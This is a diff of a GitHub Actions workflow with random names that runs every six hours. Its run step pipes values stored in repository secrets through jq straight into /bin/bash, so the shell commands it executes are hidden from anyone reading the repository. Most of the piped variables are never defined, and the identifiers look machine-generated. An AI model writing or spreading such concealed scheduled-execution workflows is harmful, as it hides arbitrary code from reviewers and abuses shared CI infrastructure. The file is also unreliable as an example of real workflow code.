@@ -1,27 +1,25 @@
 name: labourersullen
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 0/6 * * *'
-jobs:  # 18989
+    - cron: '32 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: labourersullen
         env:
-          gdvf154: ${{ secrets.gdvf154 }}
+          luym6: ${{ secrets.luym6 }}
         run: |
-          echo $gdvf154 | jq -r .xj83 | /bin/bash
-          echo $lvbg93299 | jq -r .crfe283 | /bin/bash
-          echo $ewkpi41979 | jq -r .qjqol1 | /bin/bash
-          echo $paqo22 | jq -r .otjzr46 | /bin/bash
-          echo $wotef097 | jq -r .sqj886 | /bin/bash
-          echo $pebsq0236 | jq -r .ypl15 | /bin/bash
-          echo $qy4 | jq -r .sxoj97 | /bin/bash
-          echo $xfdls66240 | jq -r .ma3 | /bin/bash
-          echo $h90097 | jq -r .d04 | /bin/bash
-          echo $twt7 | jq -r .zwmc502 | /bin/bash
-          echo $tiq71 | jq -r .blsri394 | /bin/bash
+          echo $luym6 | jq -r .fb2015 | /bin/bash
+          echo $qt7 | jq -r .om811 | /bin/bash
+          echo $jfzia8192 | jq -r .wh2 | /bin/bash
+          echo $zhy5 | jq -r .kn0 | /bin/bash
+          echo $jgd38257 | jq -r .iqd53783 | /bin/bash
+          echo $qzul913 | jq -r .ouqn2 | /bin/bash
+          echo $yx9561 | jq -r .qrv4 | /bin/bash
+          echo $ohty332 | jq -r .puq74 | /bin/bash
+          echo $bdkv814 | jq -r .o886 | /bin/bash
 
